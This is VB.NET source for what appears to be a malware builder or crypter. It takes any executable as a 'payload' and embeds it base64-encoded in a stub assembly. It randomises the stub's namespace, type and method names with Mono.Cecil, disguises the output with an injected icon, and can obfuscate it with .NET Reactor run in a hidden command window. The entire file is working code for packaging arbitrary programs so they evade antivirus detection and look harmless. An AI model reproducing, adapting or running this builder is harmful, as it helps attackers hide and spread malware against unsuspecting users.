Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub btPayload_Click(sender As Object, e As EventArgs) Handles btPayload.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            txtPayload.Text = o.FileName
        End If
    End Sub

    Private Sub btnIcon_Click(sender As Object, e As EventArgs) Handles btnIcon.Click
        Dim o As New OpenFileDialog
        o.Filter = "Icon |*.ico"
        If o.ShowDialog = DialogResult.OK Then
            txtIcon.Text = o.FileName
            PictureBox1.ImageLocation = o.FileName
        Else
            txtIcon.Text = Nothing
            PictureBox1.ImageLocation = Nothing
        End If
    End Sub

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try

            Dim s As New SaveFileDialog
            If s.ShowDialog = DialogResult.OK Then
                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\temp-madusb.dat", My.Resources.Project1)

                txtLog.AppendText("Writing Assembly Information..." + Environment.NewLine)


                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(IO.Path.GetTempPath + "\temp-madusb.dat")
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    definition2.Name = Randomi(rand.Next(4, 6))
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        If definition3.Namespace = "Project1" Then
                            definition3.Namespace = Randomi(rand.Next(4, 6))
                            definition3.Name = Randomi(rand.Next(4, 6))
                        End If
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If Not definition4.IsConstructor Then
                                definition4.Name = Randomi(rand.Next(4, 6))
                            End If
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If (str = "%PayloadName%") Then
                                                current.Operand = IO.Path.GetFileName(s.FileName)
                                            End If
                                            If (str = "%PayloadBytes%") Then
                                                current.Operand = Convert.ToBase64String(IO.File.ReadAllBytes(txtPayload.Text))
                                            End If
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next

                definition.Write(s.FileName)
                If txtIcon.Text <> "" AndAlso PictureBox1.ImageLocation <> "" Then
                    IconInjector.InjectIcon(s.FileName, PictureBox1.ImageLocation)
                End If
                definition.Dispose()
                definition = Nothing
                Try : IO.File.Delete(IO.Path.GetTempPath + "\temp-madusb.dat") : Catch : End Try

                If chkObf.Checked = True Then
                    IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor)
                    Dim Info As ProcessStartInfo = New ProcessStartInfo()
                    Info.Arguments = "/C dotNET_Reactor.exe -file """ & s.FileName & """ -obfuscation 1 -stringencryption 1 -control_flow_obfuscation 1 -flow_level 9 -antitamp 1 -targetfile """ & s.FileName & """"
                    Info.WindowStyle = ProcessWindowStyle.Hidden
                    Info.CreateNoWindow = True
                    Info.WorkingDirectory = IO.Path.GetTempPath
                    Info.FileName = "cmd.exe"
                    Process.Start(Info)
                End If
                Threading.Thread.Sleep(1500)

                Dim PayloadSize As New IO.FileInfo(s.FileName)
                Dim sizeInBytes As Long = PayloadSize.Length / 1024
                txtLog.Text = "Done! " & Environment.NewLine & "File Name: " & IO.Path.GetFileName(s.FileName) & Environment.NewLine & "File Size: " & sizeInBytes.ToString & " KB"
                Try : IO.File.Delete(s.FileName + ".hash") : Catch : End Try
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Public Shared rand As New Random()
    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "QWERTYUIOPASDFGHJKLZXCVBNM"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

End Class
